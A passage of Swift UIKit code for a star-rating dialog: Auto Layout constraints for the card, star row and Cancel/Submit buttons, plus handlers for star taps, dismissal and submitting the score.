        cancel.addTarget(self, action: #selector(reedCancel), for: .touchUpInside)
        card.addSubview(cancel)

        let submit = UIButton(type: .custom)
        submit.translatesAutoresizingMaskIntoConstraints = false
        submit.setTitle("Submit", for: .normal)
        submit.setTitleColor(.white, for: .normal)
        submit.titleLabel?.font = UIFont(name: "Ubuntu-Medium", size: 16) ?? .systemFont(ofSize: 16, weight: .medium)
        submit.addTarget(self, action: #selector(reedSubmit), for: .touchUpInside)
        card.addSubview(submit)

        NSLayoutConstraint.activate([
            card.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 16),
            card.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -16),
            card.centerYAnchor.constraint(equalTo: view.centerYAnchor, constant: 6),
            card.heightAnchor.constraint(equalToConstant: 332),

            line.leadingAnchor.constraint(equalTo: card.leadingAnchor, constant: 27),
            line.trailingAnchor.constraint(equalTo: card.trailingAnchor, constant: -27),
            line.topAnchor.constraint(equalTo: card.topAnchor, constant: 43),

            starRow.leadingAnchor.constraint(equalTo: card.leadingAnchor, constant: 25),
            starRow.trailingAnchor.constraint(equalTo: card.trailingAnchor, constant: -25),
            starRow.topAnchor.constraint(equalTo: line.bottomAnchor, constant: 25),
            starRow.heightAnchor.constraint(equalToConstant: 57),

            hline.leadingAnchor.constraint(equalTo: card.leadingAnchor),
            hline.trailingAnchor.constraint(equalTo: card.trailingAnchor),
            hline.heightAnchor.constraint(equalToConstant: 1),
            hline.bottomAnchor.constraint(equalTo: card.bottomAnchor, constant: -61),

            vline.widthAnchor.constraint(equalToConstant: 1),
            vline.topAnchor.constraint(equalTo: hline.bottomAnchor),
            vline.bottomAnchor.constraint(equalTo: card.bottomAnchor),
            vline.centerXAnchor.constraint(equalTo: card.centerXAnchor),

            cancel.leadingAnchor.constraint(equalTo: card.leadingAnchor),
            cancel.trailingAnchor.constraint(equalTo: vline.leadingAnchor),
            cancel.topAnchor.constraint(equalTo: hline.bottomAnchor),
            cancel.bottomAnchor.constraint(equalTo: card.bottomAnchor),

            submit.leadingAnchor.constraint(equalTo: vline.trailingAnchor),
            submit.trailingAnchor.constraint(equalTo: card.trailingAnchor),
            submit.topAnchor.constraint(equalTo: hline.bottomAnchor),
            submit.bottomAnchor.constraint(equalTo: card.bottomAnchor),
        ])
    }

    @objc private func reedStarTap(_ sender: UIButton) {
        reedScore = sender.tag
        for b in reedStars {
            let on = b.tag <= reedScore
            b.setImage(UIImage(named: on ? "BoS" : "BS"), for: .normal)
        }
    }

    @objc private func reedCancel() {
        dismiss(animated: true) {
            self.reedCancelTap?()
        }
    }

    @objc private func reedSubmit() {
        guard reedScore > 0 else {
            self.view.makeToast("Please take a moment to rate our service first. Thank you!", position: .top)
            return
        }
        let score = reedScore
        dismiss(animated: true) {
            self.reedSubmitTap?(score)
        }
    }
}
